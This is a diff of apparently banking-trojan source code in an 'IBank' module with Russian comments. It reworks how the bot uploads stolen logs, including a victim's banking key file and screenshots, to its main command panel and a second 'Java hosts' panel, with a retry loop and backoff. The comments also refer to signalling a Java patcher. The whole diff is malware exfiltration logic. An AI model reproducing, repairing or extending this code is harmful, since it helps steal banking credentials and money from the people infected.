@@ -270,7 +270,7 @@ namespace IBank
 		IBDBG("IBank", "Система IBANK активирована");
 		// Активированы система IBank
 		IBDBG("IBank", "Система %s активирована, %08x", System->Name, (DWORD)GetImageBase() );
-  
+    
 
 		// Сигнализируем ява патчеру о необходимости запуска патчей
 		#ifdef JAVS_PATCHERH
@@ -415,7 +415,7 @@ namespace IBank
 		#endif
 
 
-		if (Log->KeyFile != NULL)
+		if (Log->KeyFile != NULL)  
         	MultiPartData::AddFileField(Data, "keyfile", Log->KeyFile, NULL);
 
 		if (Log->StartScreenShot.Data != NULL)
@@ -476,35 +476,22 @@ namespace IBank
 
 	//-----------------------------------------------------------------------
 
-	void SendLogToAdmin(PIBankLog L, bool UseMainHosts)
+	BOOL SendLogToAdmin(PIBankLog L, bool UseMainHosts)
 	{
 		// Функция отправляет данные на необъодимую админку
 		// UseMainHosts - Указание отправлять лог на основную админку
 		if (UseMainHosts)
 			IBDBG("IBank", "Отправляем лог на основную админку бота");
-
-		for (int i = 1; i <= 10; i++)
-		{
-			PCHAR URL = GetIBankURL(UseMainHosts);
-
-
-		    IBDBG("IBank", "Отправляем лог. (Попытка %d) URL - %s", i, URL);
-
-			if (URL)
-			{
-				bool Sended = SendLog(URL, L);
-
-				STR::Free(URL);
-				if (Sended)
-				{
-					IBDBG("IBank", "Лог успешно отправлен");
-					break;
-				}
-			}
-			pSleep(60000);
+		BOOL Result = FALSE;
+		PCHAR URL = GetIBankURL(UseMainHosts);
+	    
+		if (URL)
+		{    
+			Result = SendLog(URL, L);
+			STR::Free(URL);
 		}
-
-
+		IBDBG("IBank", "Отправляем лог. [Result=%d] [URL=%s]", Result, URL);
+		return Result;
 	}
 	//-----------------------------------------------------------------------
 
@@ -517,17 +504,30 @@ namespace IBank
 		if (!L)
 			return 0;
 
+		BOOL Sended1 = FALSE;
+		BOOL Sended2 = FALSE;
+		for (int i=1; i<=10; i++)
+		{
+			// Отправляем лог на основную админку бота
+			if (!Sended1)
+				Sended1 = SendLogToAdmin(L, true);  
 
-		#ifdef JavaConfigH
-			// Если включен модуль ява хостов то, отправляем
-			// лог и на эту админку.
-			SendLogToAdmin(L, false);
-		#endif
+			#ifdef JavaConfigH
+				// Если включен модуль ява хостов то, отправляем
+				// лог и на эту админку.
+				if (!Sended2)
+					Sended2 = SendLogToAdmin(L, false);
+			#else
+				Sended2 = TRUE; 	
+			#endif
 
-		// Отправляем лог на основную админку бота
-		SendLogToAdmin(L, true);
+			if (Sended1 && Sended2) break;
 
-		// Уничтожаем данные
+			// Приостанавливаем поток
+			pSleep(5000 * i);
+		}
+
+		// Уничтожаем данные  
 		MemFree(L->EndScreenShot.Data);
 		STR::Free(L->LogFile);
 		STR::Free(L->Log);
